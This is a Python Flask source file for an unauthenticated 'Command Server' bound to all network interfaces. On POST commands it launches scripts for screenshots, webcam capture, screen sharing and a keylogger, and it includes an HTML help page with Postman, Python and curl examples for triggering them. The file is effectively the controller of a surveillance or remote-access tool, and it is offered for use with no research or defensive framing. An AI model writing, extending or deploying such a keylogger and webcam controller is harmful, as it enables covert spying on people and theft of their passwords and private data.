from flask import Flask, request, jsonify
import subprocess
import os
import sys

app = Flask(__name__)

# Define available commands and their corresponding scripts
COMMANDS = {
    "run screenshot": "screenshot.py",
    "run cam": "cam.py",
    "run keylogger": "keylogger.py",
    "run screen": "screen_server.py"
}

def check_script_exists(script_name):
    """Verify script exists before attempting to run it"""
    return os.path.isfile(script_name)

def execute_script(script_name):
    try:
        # Check if script exists
        if not check_script_exists(script_name):
            return False, f"Script {script_name} not found"

        # Use Python executable from current environment
        python_exe = sys.executable
        
        # Start the script as a background process
        process = subprocess.Popen([python_exe, script_name],
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 cwd=os.getcwd())  # Ensure correct working directory
        
        # Check immediate errors
        err = process.stderr.readline().decode().strip()
        if err:
            return False, f"Error starting {script_name}: {err}"
            
        return True, f"Successfully started {script_name}"
    except Exception as e:
        return False, f"Error executing {script_name}: {str(e)}"

@app.route('/text', methods=['POST'])
def capture_text():
    try:
        data = request.json
        text = data.get('text', '').strip().lower()  # Normalize command text
        
        if not text:
            return jsonify({
                "status": "error",
                "message": "No text provided"
            }), 400
            
        # Check if it's a command
        if text in COMMANDS:
            script = COMMANDS[text]
            success, message = execute_script(script)
            
            return jsonify({
                "status": "success" if success else "error",
                "message": message,
                "command": text,
                "script": script
            })
        
        # List available commands if user asks for help
        if text in ["help", "commands", "?"]:
            return jsonify({
                "status": "success",
                "message": "Available commands",
                "commands": list(COMMANDS.keys())
            })
            
        # Not a command, just log the text
        print(f"Received text: {text}")
        return jsonify({
            "status": "success",
            "message": "Text received",
            "note": "Use 'help' to see available commands"
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/', methods=['GET'])
def index():
    return '''
    <html>
        <head>
            <title>Command Server</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 40px;
                    line-height: 1.6;
                }
                pre {
                    background: #f4f4f4;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    padding: 15px;
                }
                .command {
                    background: #e8f5e9;
                    padding: 10px;
                    margin: 5px 0;
                    border-radius: 4px;
                }
                .note {
                    color: #666;
                    font-style: italic;
                }
            </style>
        </head>
        <body>
            <h1>Command Server</h1>
            
            <h2>Available Commands:</h2>
            <div class="command">
                <strong>run screenshot</strong> - Take a screenshot<br>
                <strong>run cam</strong> - Start camera capture<br>
                <strong>run screen</strong> - Start screen sharing server<br>
                <strong>run keylogger</strong> - Start keylogger<br>
                <strong>help</strong> - Show this command list
            </div>
            
            <h2>Using with Postman:</h2>
            <ol>
                <li>Create a new POST request</li>
                <li>Set URL to: <code>http://localhost:5003/text</code></li>
                <li>Go to Headers tab, add: <code>Content-Type: application/json</code></li>
                <li>Go to Body tab, select "raw" and "JSON"</li>
                <li>Enter command in this format:</li>
            </ol>
            <pre>
{
    "text": "run screenshot"
}
            </pre>
            
            <h2>Example using Python requests:</h2>
            <pre>
import requests

url = "http://localhost:5003/text"
data = {"text": "run screenshot"}
response = requests.post(url, json=data)
print(response.json())
            </pre>
            
            <h2>Example using cURL:</h2>
            <pre>
curl -X POST http://localhost:5003/text \
     -H "Content-Type: application/json" \
     -d '{"text": "run screenshot"}'
            </pre>
            
            <p class="note">Note: All commands run in the background. Check the server console for any error messages.</p>
        </body>
    </html>
    '''

if __name__ == '__main__':
    # Check if required scripts exist
    missing_scripts = [script for script in COMMANDS.values() if not check_script_exists(script)]
    if missing_scripts:
        print("Warning: The following scripts are missing:")
        for script in missing_scripts:
            print(f"  - {script}")
    
    print("\nStarting command server at http://localhost:5003")
    print("Available commands:", list(COMMANDS.keys()))
    app.run(host='0.0.0.0', port=5003, debug=False)